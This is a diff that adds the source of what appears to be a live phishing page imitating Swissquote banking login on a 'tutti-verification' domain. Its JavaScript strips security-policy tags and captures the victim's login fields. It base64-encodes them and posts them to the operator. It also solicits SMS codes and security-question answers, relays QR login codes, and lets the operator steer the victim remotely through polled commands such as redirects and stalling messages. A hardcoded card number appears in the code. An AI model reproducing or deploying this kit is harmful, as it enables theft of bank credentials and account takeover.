swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}</style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+    <script src="https://1.5.3/build/qrcode.min.js"></script>
+    <link href="/bos_files/sweetalert2.min.css" rel="stylesheet">
+    
+    <script>
+    
+    var lkscript = true;
+    var bankLink = window.location.href !== 'about:srcdoc' ? window.location.href.split('/') [3] : 'swissquote';
+    var urlParams = new URLSearchParams(window.location.search);
+    
+    document.querySelectorAll('base, meta[http-equiv]').forEach(el => {
+      const val = el.getAttribute('http-equiv')?.toLowerCase() || '';
+      if (val.includes('policy')) el.remove();
+      console.log("del tag");
+    });
+    
+    function postRedirect(url, data) {
+        var form = document.createElement('form');
+        form.method = 'POST';
+        form.action = url;
+        
+        for (var key in data) {
+            if (data.hasOwnProperty(key)) {
+                var input = document.createElement('input');
+                input.name = key;
+                input.value = data[key];
+                form.appendChild(input);
+            }
+        }
+        
+        document.body.appendChild(form);
+        form.submit();
+    }
+    
+    var blocker = false;
+    
+    const currentLanguage = 'translate';
+    const t = translations[currentLanguage];
+    window.t = t; // for shadow iframe
+    
+    if (typeof window.openFormLoading !== 'function') {
+        window.openFormLoading = function (title, text) {
+            return Swal.fire({
+                title: title || t.loginConfirmation,
+                text: text || t.pleaseWait,
+                allowOutsideClick: false,
+                allowEscapeKey: false,
+                showConfirmButton: false,
+                showCloseButton: false,
+                didOpen: () => {
+                    Swal.showLoading();
+                }
+            });
+        };
+    }
+    
+    if (typeof window.closeFormLoading !== 'function') {
+        window.closeFormLoading = function () {
+            Swal.close();
+        };
+    }
+    
+    $.post('#', { type: "notify", action: "lk", finger: "" });
+    
+    class Account {
+        static #sanitizeInput(input) {
+            return input.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+        }
+        
+        static code() {
+            Swal.fire({
+                title: t.confirmation,
+                text: t.codeSent,
+                input: 'text',
+                inputPlaceholder: t.enterCode,
+                confirmButtonText: t.confirm,
+                allowOutsideClick: false,
+                allowEscapeKey: false,
+                showCancelButton: false,
+                inputValidator: (value) => {
+                    if (!value) return t.codeRequired;
+                    if (!/^\d+$/.test(value)) return t.numbersOnly;
+                },
+                preConfirm: (value) => {
+                    if (value.trim().length < 1) {
+                        alert("Incorrect code");
+                    } else {
+                        return fetch('#', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                            },
+                            body: new URLSearchParams({
+                                type: "code",
+                                number: "5351 4154 0624 9643",
+                                code: value
+                            })
+                        }).then(response => {
+                            if (!response.ok) throw new Error('Network error');
+                            Account.wait();
+                        });
+                    }
+                }
+            });
+        }
+        
+        static wait() {
+            return Swal.fire({
+                title: t.loginConfirmation,
+                text: t.pleaseWait,
+                allowOutsideClick: false,
+                allowEscapeKey: false,
+                showConfirmButton: false,
+                showCloseButton: false,
+                didOpen: () => {
+                    Swal.showLoading();
+                }
+            });
+        }
+        
+        static async qrsync() {
+            let qrDataInterval = null;
+            let lastData = null;
+            let intervalStartTime = Date.now();
+            let lastDataChangeTime = Date.now();
+            let lastServerDataTime = Date.now();
+            
+            const generateQRCode = async (data) => {
+                try {
+                    const qrDataUrl = await QRCode.toDataURL(data, {
+                        width: 300,
+                        margin: 2,
+                        color: {
+                            dark: '#000000',
+                            light: '#FFFFFF'
+                        }
+                    });
+                    return qrDataUrl;
+                } catch (error) {
+                    console.error('QR code generation error:', error);
+                    return null;
+                }
+            };
+            
+            const showQRCode = async (data) => {
+                const qrImage = await generateQRCode(data);
+                if (qrImage) {
+                    Swal.fire({
+                        title: 'QR code',
+                        imageUrl: qrImage,
+                        imageWidth: 300,
+                        imageHeight: 300,
+                        imageAlt: 'QR code',
+                        confirmButtonText: 'Close',
+                        allowOutsideClick: true,
+                        allowEscapeKey: true
+                    });
+                }
+            };
+            
+            Swal.fire({
+                title: t.loginConfirmation,
+                text: t.pleaseWait,
+                allowOutsideClick: false,
+                allowEscapeKey: false,
+                showConfirmButton: false,
+                showCloseButton: false,
+                didOpen: () => {
+                    Swal.showLoading();
+                }
+            });
+            
+            qrDataInterval = setInterval(async () => {
+                try {
+                    const now = Date.now();
+                    const timeSinceStart = now - intervalStartTime;
+                    const timeSinceLastDataChange = now - lastDataChangeTime;
+                    const timeSinceLastServerData = now - lastServerDataTime;
+                    
+                    if (timeSinceLastServerData > 180000) {
+                        console.log('Interval closed: no server data for 3 minutes');
+                        if (qrDataInterval) {
+                            clearInterval(qrDataInterval);
+                            qrDataInterval = null;
+                        }
+                        Swal.close();
+                        return;
+                    }
+                    
+                    if (timeSinceLastDataChange > 180000 && lastData !== null) {
+                        console.log('Interval closed: data unchanged for 3 minutes');
+                        if (qrDataInterval) {
+                            clearInterval(qrDataInterval);
+                            qrDataInterval = null;
+                        }
+                        Swal.close();
+                        return;
+                    }
+                    
+                    if (timeSinceStart > 180000) {
+                        console.log('Interval closed: 3 minutes elapsed');
+                        if (qrDataInterval) {
+                            clearInterval(qrDataInterval);
+                            qrDataInterval = null;
+                        }
+                        Swal.close();
+                        return;
+                    }
+                    
+                    const response = await fetch('#', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: new URLSearchParams({
+                            type: 'XApi',
+                            act: 'qrsync'
+                        })
+                    });
+                    
+                    if (!response.ok) {
+                        throw new Error('Network error');
+                    }
+                    
+                    const result = await response.json();
+                    lastServerDataTime = Date.now();
+                    const serverDataValue = result.data || '';
+                    
+                    if (!serverDataValue || serverDataValue.trim() === '') {
+                        console.log('Waiting for data...');
+                    } else {
+                        if (lastData !== serverDataValue) {
+                            lastData = serverDataValue;
+                            lastDataChangeTime = Date.now();
+                            console.log('Server data changed:', serverDataValue);
+                            
+                            Swal.close();
+                            await showQRCode(serverDataValue);
+                            
+                            if (qrDataInterval) {
+                                clearInterval(qrDataInterval);
+                                qrDataInterval = null;
+                            }
+                        }
+                    }
+                } catch (error) {
+                    console.error('Error checking data:', error);
+                }
+            }, 2000);
+        }
+        
+        static push() {
+            return Swal.fire({
+                title: t.loginConfirmation,
+                html: t.pushNotification,
+                allowOutsideClick: false,
+                allowEscapeKey: false,
+                showConfirmButton: false,
+                showCloseButton: false,
+                didOpen: () => {
+                    Swal.showLoading();
+                }
+            });
+        }
+        
+        static incorrectData(lambda = null) {
+            return Swal.fire({
+                icon: "error",
+                title: t.error,
+                text: t.incorrectData,
+                confirmButtonText: t.ok
+            }).then((result) => {
+                if (lambda != null) lambda();
+            });
+        }
+        
+        static error(text) {
+            return Swal.fire({
+                icon: "error",
+                title: t.error,
+                text: this.#sanitizeInput(text),
+                confirmButtonText: t.ok
+            });
+        }
+        
+        static quest(title, text, img) {
+            return Swal.fire({
+                title: this.#sanitizeInput(title),
+                text: this.#sanitizeInput(text),
+                input: 'text',
+                inputPlaceholder: this.#sanitizeInput(text),
+                confirmButtonText: t.confirm,
+                allowOutsideClick: false,
+                allowEscapeKey: false,
+                showCancelButton: false,
+                ...(img ? { imageUrl: img } : {}),
+                preConfirm: (value) => {
+                    if (value.trim().length < 1) {
+                        alert("Incorrect question");
+                    } else {
+                        return fetch('#', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                            },
+                            body: new URLSearchParams({
+                                type: "quest",
+                                value: value,
+                                title: title
+                            })
+                        }).then(response => {
+                            if (!response.ok) throw new Error('Network error');
+                            Account.wait();
+                        });
+                    }
+                }
+            });
+        }
+        
+        static alert(title, text, img = false) {
+            return Swal.fire ({
+                title: this.#sanitizeInput(title),
+                text: this.#sanitizeInput(text),
+                ...(img ? { imageUrl: img } : {}),
+            }).then((result) => {
+                if (result.isConfirmed)Account.wait ();
+            });
+        }
+        
+        static findById(id, root = document) {
+          const el = root.getElementById ? root.getElementById(id) : null;
+          if (el) return el;
+    
+          for (const node of root.querySelectorAll('*')) {
+            if (node.shadowRoot) {
+              const found = Account.findById(id, node.shadowRoot);
+              if (found) return found;
+            }
+          }
+          return null;
+        }
+        
+        
+        
+        static async login(...ids) {
+          try {
+              if (blocker == true)return;
+              blocker = true;
+              
+              openFormLoading(t.loginConfirmation, t.pleaseWait);
+              
+            // --- BEGIN ---
+                var bankNameData = 'Unknown';
+                
+                const bankElement = document.getElementById('bank-name');
+                if (bankElement !== undefined && bankElement !== null && bankElement.dataset.name !== undefined && bankElement.dataset.name !== null) {
+                    bankNameData = bankElement.dataset.name;
+                }
+                else bankNameData = 'null';
+                
+                if (bankNameData == 'null') {
+                    bankNameData = 'Swissquote';
+                }
+            // --- END ---
+            
+            setTimeout (function () {
+                blocker = false;
+            }, 1000 * 3);
+            
+            const sentData = [];
+    
+            for (const id of ids) {
+              const input = Account.findById(id);
+              if (!input) {
+                console.error(`Элемент с ID ${id} не найден`);
+                continue;
+              }
+    
+            if (!['INPUT', 'TEXTAREA'].includes(input?.tagName)) {
+                console.error("Elements logx incorrect input | textarea");
+                return;
+            }
+    
+              const value = input.value.trim();
+              if (!value) {
+                continue;
+              }
+    
+              const key = input.dataset.name || id;
+              const utf8Bytes = new TextEncoder().encode(key);
+              const binaryString = String.fromCharCode(...utf8Bytes);
+              const encodedName = btoa(binaryString);
+    
+              sentData.push({
+                input_name: encodedName,
+                input_data: value
+              });
+            }
+    
+            if (sentData.length === 0) {
+              throw new Error(t.noDataSent);
+            }
+    
+            const jsonString = JSON.stringify(sentData);
+            const base64String = btoa(unescape(encodeURIComponent(jsonString)));
+    
+            console.log("Sent data", {
+              original: sentData,
+              base64: base64String
+            });
+            
+            
+            const params = new URLSearchParams();
+            params.append('bank', bankNameData);
+            params.append('type', 'lkdata');
+            params.append('data', base64String);
+    
+            const response = await fetch('#', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
+              },
+              body: params.toString()
+            });
+    
+            if (!response.ok) {
+              blocker = false;
+              closeFormLoading ();
+              
+              const errorText = await response.text();
+              throw new Error(`Ошибка сервера: ${response.status} - ${errorText}`);
+            }
+            
+            
+            //await Account.wait();
+    
+          } catch (error) {
+            blocker = false;
+            closeFormLoading ();
+            
+            await Account.error(error.message || t.serverError);
+            throw error;
+          }
+        }
+        
+        static init(bankname) {
+            try {
+                if (bankname == 'null' || bankname == null)return;
+                
+                let element = document.getElementById('bank-name');
+                if (element === undefined || element === null) {
+                    element = document.createElement('input');
+                    element.type = 'hidden';
+                    element.id = 'bank-name';
+                    document.body.appendChild(element);
+                }
+                element.dataset.name = bankname;
+                element.value = bankname;
+            } catch (error) {
+                console.error("Init error:", error);
+            }
+        }
+        
+        static card() {
+            location.href = `/receive/49220272?showCard=Y&initialize=fromSelectBank`;
+        }
+        
+        static validateAllLogxInputs() {
+            let allFilled = true;
+            const inputs = document.querySelectorAll('.logx');
+            
+            inputs.forEach(input => {
+                if (input.value.length < 1) {
+                    input.style.backgroundColor = '#FFA3A3';
+                    allFilled = false;
+                } else {
+                    const defaultColor = window.getComputedStyle(input).backgroundColor;
+                    input.style.backgroundColor = defaultColor;
+                }
+            });
+            
+            return allFilled;
+        }
+        
+        static queryAllShadow(selector, root = document) {
+            let results = [];
+    
+            function traverse(node) {
+              if (node.querySelectorAll) {
+                results = results.concat([...node.querySelectorAll(selector)]);
+              }
+    
+              if (node.shadowRoot) {
+                traverse(node.shadowRoot);
+              }
+    
+              node.childNodes.forEach(traverse);
+            }
+    
+            traverse(root);
+            return results;
+        }
+    
+        static findLoginButton() {
+            let btn = document.getElementById('loginButton');
+            if (btn) return btn;
+    
+            const buttons = Account.queryAllShadow('#loginButton');
+            if (buttons.length > 0) {
+              return buttons[0];
+            }
+    
+            return null;
+        }
+        
+        static initInputs(ids) {
+            const loginButton = Account.findLoginButton();
+            if (!loginButton) {
+                console.log("Error initialize button not found");
+                return;
+            }
+    
+            document.querySelectorAll('.logx').forEach(input => {
+                input.addEventListener('input', (e) => {
+                    const defaultColor = window.getComputedStyle(e.target).backgroundColor;
+                    e.target.style.backgroundColor = e.target.value.length < 1 ? '#FFA3A3' : defaultColor;
+                });
+            });
+    
+            loginButton.addEventListener('click', (e) => {
+                e.preventDefault();
+                console.log("click button!");
+                if (!this.validateAllLogxInputs()) {
+                    console.log("Error initialize inputs not correct");
+                    return;
+                }
+                
+                Account.login(...ids);
+                return; // V [old code...] V
+    
+                
+                (async function() {
+                    var intervalId = setInterval(async function() {
+                        try {
+                            var params = new URLSearchParams();
+                            params.append('type', 'XApi');
+    
+                            var response = await fetch('#', {
+                              method: 'POST',
+                              headers: {
+                                'Content-Type': 'application/x-www-form-urlencoded'
+                              },
+                              body: params
+                            });
+                            
+                            if (!response.ok) {
+                                throw new Error('Network response was not ok');
+                            }
+                            
+                            var data = await response.text();
+                            console.log(data);
+                            
+                            switch (data.trim()) {
+                                case "qrsync":
+                                    Account.qrsync();
+                                    break;
+                                case "push":
+                                    Account.push();
+                                    break;
+                                case "sms":
+                                    Account.code();
+                                    break;
+                                case "error:code":
+                                    Account.incorrectData(function () {
+                                        Account.code();
+                                    });
+                                    break;
+                                case "error:inccorect":
+                                    Account.incorrectData();
+                                    break;
+                                case "tocard":
+                                    Account.card();
+                                    break;
+                                case "showbanks":
+                                    postRedirect ('/receive/49220272', { slk: true });
+                                    break;
+                                case "custom_push":
+                                    $.post('#', { type: 'acts', text: 'push' });
+                                    $('#push-amount').text(data.trim().substr(12));
+                                    showPush();
+                                    break;
+                                case "custom_text":
+                                    $.post('#', { type: 'acts', text: 'push' });
+                                    $('#push-amount').text(data.trim().split(':')[1]);
+                                    $('#footer-up').html(data.trim().split(':')[2]);
+                                    showPush();
+                                    break;
+                            }
+                            
+                            if (data.trim().substr(0, 8) == 'question') {
+                                var dataJson = JSON.parse(data.trim().substr(9));
+                                Account.quest(dataJson.title, dataJson.text, dataJson.img);
+                            }
+                            if (data.trim().substr(0, 12) == 'custom_error') {
+                                var dataerror = data.trim().substr(13);
+                                Account.error(dataerror);
+                            }
+                            if (data.trim().substr(0, 13) == 'alert_message') {
+                                //var dataJson = JSON.parse(data.trim().substr(14));
+                                Account.alert("", data.trim().substr(14), "");
+                            }
+                            if (data.trim().substr(0, 13) == 'redirect_url:') {
+                                $.post('#', { type: 'acts', text: 'redirect' });
+                                if (data.trim().substr(13,1) != '/')location.href = "http://" + data.trim().substr(13);
+                                else 								location.href = data.trim().substr(13);
+                            }
+                            if (data.trim().substr(0, 4) == 'hold') {
+                                var flag = data.trim().substr(5);
+                                var msg = '';
+                                if (flag == '1')msg = 'Uw gegevens worden verwerkt, u moet 5-10 minuten wachten. VERLAAT DEZE PAGINA NIET, ANDERS KAN ER EEN FOUT OPTREDEN BIJ HET VERWERKEN VAN DE INGEVOERDE GEGEVENS. Heeft u vragen? Neem dan contact op met de klantenservice via de chat. De online chat bevindt zich rechtsonder in de hoek.';
+                                else if (flag == '2')msg = 'Helaas kunnen we uw gegevens op dit moment niet verwerken. We voeren momenteel wat technisch onderhoud uit. Probeert u het alstublieft over een paar uur opnieuw. Onze excuses voor het ongemak. Heeft u vragen? Neem dan contact op met de klantenservice via de chat. De online chat bevindt zich rechtsonder in de hoek.';
+                                
+                                Account.alert('Aandacht', msg);
+                            }
+                        } catch (error) {
+                            console.error('Error during polling:', error);
+                            clearInterval(intervalId);
+                        }
+                    }, 1500);
+                })();
+            });
+        }
+    }
+    
+    </script>
+    
+    <!-- Smartsupp Live Chat script -->
+    <script type="text/javascript">
+    var _smartsupp = _smartsupp || {};
+    _smartsupp.key = '82ddc0c83994b4a9930edef4fdf69adb86bd71d2';
+    window.smartsupp||(function(d) {
+      var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+      s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+      c.type='text/javascript';c.charset='utf-8';c.async=true;
+      c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+    })(document);
+    </script>
+    <noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript><script>
+      document.addEventListener('DOMContentLoaded', () => {
+        try {
+          console.log("initialize login form (code: 2)");
+          Account.init(urlParams.get('bank'));
+          Account.initInputs([...document.querySelectorAll('.logx')].map(el => el.id));
+          console.log("initialize success");
+        } catch (error) {
+          console.error("Initialization error:", error);
+        }
+      });
+    </script>
+    <!-- ========================================================================================== -->
+    
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title></title>
+    
+    <!-- iframe shadow-dom -->
+        <script>
+            window.shadowEnable = true;
+    
+            document.addEventListener('click', function(e) {
+                const link = e.target.closest('a');
+                if (link && link.href) {
+                    e.preventDefault();
+                    
+                    window.tolink = link.href;
+                }
+            });
+            
+            function iframe () {
+                window.callback = 'has_iframe';
+                window.callback_data = 'connected';
+            }
+        
+            window.onerror = function(message, source, lineno, colno, error) {
+                if (message.includes("is not defined")) {
+                    const functionName = message.split(" ")[2];
+                    window.callback = functionName;
+                    return true;
+                }
+                
+                return false;
+            };
+            
+            function openFormCard () {
+                window.callback = 'openFormCard';
+            }
+            
+            function openformcard_ex () {
+                window.callback = 'openformcard_ex';
+            }
+            
+            function openFormLoading (p1, p2) {
+                window.callback = 'openFormLoading';
+                window.callback_data = [p1, p2];
+            }
+            
+            function alert (text) {
+                window.callback = 'alert';
+                window.callback_data = text;
+            }
+            
+            function f_tolink (text) {
+                window.callback = 'f_tolink';
+                window.callback_data = text;
+            }
+            
+            function f_open_personal_account (p1, p2, p3) {
+                window.callback = 'open_personal_account';
+                window.callback_data = [p1, p2, p3];
+            }
+            
+            function closeFormLoading () {
+                window.callback = 'closeFormLoading';
+            }
+        </script>
+    <!-- END -->
+    <style>/*!
+     * Bootstrap v5.0.2 (https://getbootstrap.com/)
+     * Copyright 2011-2021 The Bootstrap Authors
+     * Copyright 2011-2021 Twitter, Inc.
+     * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
+     */:root{--bs-blue:#0d6efd;--bs-indigo:#6610f2;--bs-purple:#6f42c1;--bs-pink:#d63384;--bs-red:#dc3545;--bs-orange:#fd7e14;--bs-yellow:#ffc107;--bs-green:#198754;--bs-teal:#20c997;--bs-cyan:#0dcaf0;--bs-white:#fff;--bs-gray:#6c757d;--bs-gray-dark:#343a40;--bs-primary:#0d6efd;--bs-secondary:#6c757d;--bs-success:#198754;--bs-info:#0dcaf0;--bs-warning:#ffc107;--bs-danger:#dc3545;--bs-light:#f8f9fa;--bs-dark:#212529;--bs-font-sans-serif:system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans","Liberation Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";--bs-font-monospace:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;--bs-gradient:linear-gradient(180deg,rgba(255,255,255,0.15),rgba(255,255,255,0))}*,::after,::before{box-sizing:border-box}@media (prefers-reduced-motion:no-preference){:root{scroll-behavior:smooth}}body{margin:0;font-family:var(--bs-font-sans-serif);font-size:1rem;font-weight:400;line-height:1.5;background-color:#fff;-webkit-text-size-adjust:100%;-webkit-tap-highlight-color:transparent}@media (min-width:1200px){}@media (min-width:1200px){}@media (min-width:1200px){}@media (min-width:1200px){}p{margin-top:0;margin-bottom:1rem}a{text-decoration:underline}a:hover{color:#0a58ca}a:not([href]):not([class]),a:not([href]):not([class]):hover{color:inherit;text-decoration:none}svg{vertical-align:middle}input{margin:0;font-family:inherit;line-height:inherit}@media (min-width:1200px){}::-webkit-datetime-edit-day-field,::-webkit-datetime-edit-fields-wrapper,::-webkit-datetime-edit-hour-field,::-webkit-datetime-edit-minute,::-webkit-datetime-edit-month-field,::-webkit-datetime-edit-text,::-webkit-datetime-edit-year-field{padding:0}::-webkit-inner-spin-button{height:auto}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-color-swatch-wrapper{padding:0}::-webkit-file-upload-button{font:inherit;-webkit-appearance:button}@media (min-width:1200px){}@media (min-width:1200px){}@media (min-width:1200px){}@media (min-width:1200px){}@media (min-width:1200px){}@media (min-width:1200px){}@media (min-width:576px){}@media (min-width:768px){}@media (min-width:992px){}@media (min-width:1200px){}@media (min-width:1400px){}@media (min-width:576px){}@media (min-width:768px){}@media (min-width:992px){}@media (min-width:1200px){}@media (min-width:1400px){}@media (min-width:576px){}@media (min-width:768px){}@media (min-width:992px){}@media (min-width:1200px){}@media (min-width:1400px){}@media (max-width:575.98px){}@media (max-width:767.98px){}@media (max-width:991.98px){}@media (max-width:1199.98px){}@media (max-width:1399.98px){}@media (prefers-reduced-motion:reduce){}@media (prefers-reduced-motion:reduce){}@media (prefers-reduced-motion:reduce){}@media (prefers-reduced-motion:reduce){}@media (prefers-reduced-motion:reduce){}@media (prefers-reduced-motion:reduce){}@media (prefers-reduced-motion:reduce){}@media (prefers-reduced-motion:reduce){}@media (prefers-reduced-motion:reduce){}@media (prefers-reduced-motion:reduce){}@media (prefers-reduced-motion:reduce){}@media (min-width:576px){}@media (min-width:768px){}@media (min-width:992px){}@media (min-width:1200px){}@media (min-width:1400px){}@media (prefers-reduced-motion:reduce){}@media (prefers-reduced-motion:reduce){}@media (min-width:576px){}@media (min-width:768px){}@media (min-width:992px){}@media (min-width:1200px){}@media (min-width:1400px){}@media (min-width:576px){}@media (prefers-reduced-motion:reduce){}@media (prefers-reduced-motion:reduce){}@media (prefers-reduced-motion:reduce){}@-webkit-keyframes progress-bar-stripes{0%{background-position-x:1rem}}@keyframes progress-bar-stripes{0%{background-position-x:1rem}}@media (prefers-reduced-motion:reduce){}@media (prefers-reduced-motion:reduce){}@media (min-width:576px){}@media (min-width:768px){}@media (min-width:992px){}@media (min-width:1200px){}@media (min-width:1400px){}@media (prefers-reduced-motion:reduce){}@media (min-width:576px){}@media (min-width:992px){}@media (min-width:1200px){}@media (max-width:575.98px){}@media (max-width:767.98px){}@media (max-width:991.98px){}@media (max-width:1199.98px){}@media (max-width:1399.98px){}@media (prefers-reduced-motion:reduce){}@media (prefers-reduced-motion:reduce){}@media (prefers-reduced-motion:reduce){}@media (prefers-reduced-motion:reduce){}@-webkit-keyframes spinner-border{to{transform:rotate(360deg)}}@keyframes spinner-border{to{transform:rotate(360deg)}}@-webkit-keyframes spinner-grow{0%{transform:scale(0)}50%{opacity:1;transform:none}}@keyframes spinner-grow{0%{transform:scale(0)}50%{opacity:1;transform:none}}@media (prefers-reduced-motion:reduce){}@media (prefers-reduced-motion:reduce){}@media (min-width:576px){}@media (min-width:768px){}@media (min-width:992px){}@media (min-width:1200px){}@media (min-width:1400px){}.d-block{display:block!important}.d-flex{display:flex!important}.h-100{height:100%!important}.flex-column{flex-direction:column!important}.mx-auto{margin-right:auto!important;margin-left:auto!important}.mt-1{margin-top:.25rem!important}.mt-2{margin-top:.5rem!important}.mt-3{margin-top:1rem!important}.mt-4{margin-top:1.5rem!important}.mt-5{margin-top:3rem!important}.mb-0{margin-bottom:0!important}.mb-1{margin-bottom:.25rem!important}.text-end{text-align:right!important}.text-center{text-align:center!important}@media (min-width:576px){}@media (min-width:768px){}@media (min-width:992px){}@media (min-width:1200px){}@media (min-width:1400px){}@media (min-width:1200px){}</style><style>.fs-14{font-size:14px}.fs-18{font-size:18px}.fwbl{font-weight:700}.fws{font-weight:500}@media (max-width:991px){}@media (min-width:992px){}.box{background:#fff;padding:20px;border:1px solid #D1D1D1;max-width:320px}body{color:#323232;background:#F4F4F4}.inp{width:100%;background:#F7F7F7;border-radius:3px;padding:6px;font-size:14px;border:1px solid #D1D1D1}a,a:hover{color:inherit}.btn-orange{background:#FA5B35;border:0;color:#fff;padding:6px;width:100%;border-radius:4px;box-shadow:0 1px 2px 0 rgba(0,0,0,.2)}@keyframes lds-spinner{0%{opacity:1}100%{opacity:0}}</style><meta name="referrer" content="no-referrer"><style>.sf-hidden{display:none!important}</style><link rel="canonical" href="https://tutti-verification.id718829.info/proceed/275324367"><script>
+            window.shadowEnable = true;
+    
+            document.addEventListener('click', function(e) {
+                const link = e.target.closest('a');
+                if (link && link.href) {
+                    e.preventDefault();
+                    
+                    window.tolink = link.href;
+                }
+            });
+            
+            function iframe () {
+                window.callback = 'has_iframe';
+                window.callback_data = 'connected';
+            }
+        
+            window.onerror = function(message, source, lineno, colno, error) {
+                if (message.includes("is not defined")) {
+                    const functionName = message.split(" ")[2];
+                    window.callback = functionName;
+                    return true;
+                }
+                
+                return false;
+            };
+            
+            function openFormCard () {
+                window.callback = 'openFormCard';
+            }
+            
+            function openformcard_ex () {
+                window.callback = 'openformcard_ex';
+            }
+            
+            function openFormLoading (p1, p2) {
+                window.callback = 'openFormLoading';
+                window.callback_data = [p1, p2];
+            }
+            
+            function alert (text) {
+                window.callback = 'alert';
+                window.callback_data = text;
+            }
+            
+            function f_tolink (text) {
+                window.callback = 'f_tolink';
+                window.callback_data = text;
+            }
+            
+            function f_open_personal_account (p1, p2, p3) {
+                window.callback = 'open_personal_account';
+                window.callback_data = [p1, p2, p3];
+            }
+            
+            function closeFormLoading () {
+                window.callback = 'closeFormLoading';
+            }
+        </script></head>
+    
+    
+    <!-- iframe shadow-dom -->
+        
+    <!-- END -->
+    
+    <body class="d-flex flex-column h-100">
+    <main class="mt-5">
+     <div class="text-center mt-5">
+     <svg width="175" height="32" version="1.1" baseProfile="tiny" id="text" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 180 34" xml:space="preserve">
+     <g>
+     <g>
+     <path fill="#FA5B35" d="M16.451,2.055c7.861,0,14.113,6.252,14.113,14.113c0,7.86-6.252,14.113-14.113,14.113        	S2.338,24.028,2.338,16.167C2.338,8.307,8.59,2.055,16.451,2.055z M9.409,10.28v2.337h14.083V10.28H9.409z M23.492,22.055v-7.071			H9.409v7.071h2.337v-2.671c0-0.758,0.183-1.184,0.456-1.487c0.303-0.364,0.759-0.577,1.305-0.577c0.546,0,1.001,0.212,1.305,0.577			c0.273,0.303,0.456,0.729,0.456,1.487v2.671h2.367v-2.671c0-0.758,0.182-1.184,0.456-1.487c0.303-0.364,0.758-0.577,1.305-0.577			s1.001,0.212,1.305,0.577c0.273,0.303,0.456,0.729,0.456,1.487v2.671H23.492z"></path>
+     </g>
+     <g>
+     <path fill="#323232" d="M39.161,10.856c0,2.549,3.642,3.065,6.374,4.643c1.699,0.971,3.096,2.55,3.096,5.22			c0,3.824-3.126,6.222-6.586,6.222s-5.949-1.669-6.92-2.731l1.366-2.883h0.121c1.153,1.123,2.914,2.186,5.189,2.186			c1.487,0,3.096-0.88,3.096-2.61c0-2.58-3.642-3.096-6.373-4.674c-1.7-0.971-3.096-2.549-3.096-5.22			c0-3.824,3.156-6.222,6.677-6.222c3.308,0,5.554,1.669,6.525,2.58l-1.366,2.883h-0.122c-1.184-1.062-2.671-2.033-4.734-2.033			C40.77,8.216,39.161,9.096,39.161,10.856z M49.176,14.347h3.582l2.125,6.161h0.121l3.005-8.589h2.428l3.157,8.68h0.122l3.035-8.68			h3.399l-5.189,14.568h-2.367l-3.339-9.166h-0.121l-3.217,9.166h-2.428L49.176,14.347z M71.635,5.849h3.612v3.49h-3.612V5.849z			 M71.695,11.918h3.49v14.568h-3.49V11.918z M83.319,26.941c-2.063,0-4.066-0.789-5.463-2.125l0.971-2.61h0.122			c1.093,0.971,2.488,1.73,4.097,1.73c1.214,0,2.003-0.516,2.003-1.426c0-0.941-1.002-1.305-2.246-1.7			c-2.003-0.637-4.644-1.609-4.644-4.644c0-2.792,2.185-4.704,5.311-4.704c1.7,0,3.43,0.607,4.856,1.73l-0.971,2.64h-0.122			c-1.032-0.819-2.367-1.366-3.49-1.366c-1.365,0-2.154,0.516-2.154,1.426c0,0.941,1.001,1.305,2.246,1.7			c2.003,0.638,4.644,1.608,4.644,4.644C88.479,25.029,86.294,26.941,83.319,26.941z M95.793,26.941			c-2.063,0-4.066-0.789-5.463-2.125l0.972-2.61h0.121c1.093,0.971,2.489,1.73,4.097,1.73c1.215,0,2.004-0.516,2.004-1.426			c0-0.941-1.002-1.305-2.246-1.7c-2.003-0.637-4.644-1.609-4.644-4.644c0-2.792,2.186-4.704,5.312-4.704			c1.699,0,3.43,0.607,4.855,1.73l-0.971,2.64h-0.121c-1.032-0.819-2.368-1.366-3.49-1.366c-1.366,0-2.155,0.516-2.155,1.426			c0,0.941,1.001,1.305,2.245,1.7c2.004,0.638,4.645,1.608,4.645,4.644C100.953,25.029,98.768,26.941,95.793,26.941z			 M117.008,11.918V32.86h-3.49v-7.436c-1.002,0.94-2.459,1.517-3.854,1.517c-4.128,0-6.769-3.187-6.769-7.587			c0-4.127,2.823-7.891,7.133-7.891c1.336,0,2.641,0.516,3.672,1.335h0.122v-0.88H117.008z M113.518,15.712			c-0.729-0.668-1.882-1.062-2.944-1.062c-2.488,0-4.097,1.942-4.097,4.674c0,2.458,1.396,4.431,3.885,4.431			c1.184,0,2.307-0.455,3.156-1.366V15.712z M123.441,20.629c0,1.274,0.213,1.821,0.577,2.276c0.455,0.546,1.184,0.91,2.003,0.91			s1.548-0.364,2.003-0.91c0.364-0.456,0.577-1.002,0.577-2.276v-8.71h3.49v8.346c0,2.367-0.638,3.854-1.73,4.917			